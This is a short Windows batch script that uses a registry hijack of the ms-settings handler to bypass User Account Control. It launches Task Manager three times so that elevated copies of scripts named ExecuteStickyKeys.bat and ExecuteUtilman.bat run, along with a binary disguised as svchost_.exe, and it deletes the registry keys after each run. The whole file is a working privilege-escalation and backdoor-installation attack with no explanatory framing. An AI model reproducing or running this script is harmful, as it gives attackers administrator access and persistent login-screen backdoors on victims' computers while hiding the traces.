@echo off
:: ---------------------------
:: Set current directory
:: ---------------------------
set "currentDir=%~dp0"

:: ---------------------------
:: Bypass UAC via Task Manager - ExecuteStickyKeys.bat
:: ---------------------------
REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "%currentDir%ExecuteStickyKeys.bat"
REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /v "DelegateExecute" /d ""
start "" "C:\Windows\System32\Taskmgr.exe"
timeout /t 5 >nul
REG DELETE "HKCU\Software\Classes\ms-settings" /f

:: ---------------------------
:: Bypass UAC via Task Manager - ExecuteUtilman.bat
:: ---------------------------
REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "%currentDir%ExecuteUtilman.bat"
REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /v "DelegateExecute" /d ""
start "" "C:\Windows\System32\Taskmgr.exe"
timeout /t 5 >nul
REG DELETE "HKCU\Software\Classes\ms-settings" /f

:: ---------------------------
:: Bypass UAC via Task Manager - svchost_.exe
:: ---------------------------
REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "%currentDir%svchost_.exe"
REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /v "DelegateExecute" /d ""
start "" "C:\Windows\System32\Taskmgr.exe"
timeout /t 5 >nul
REG DELETE "HKCU\Software\Classes\ms-settings" /f
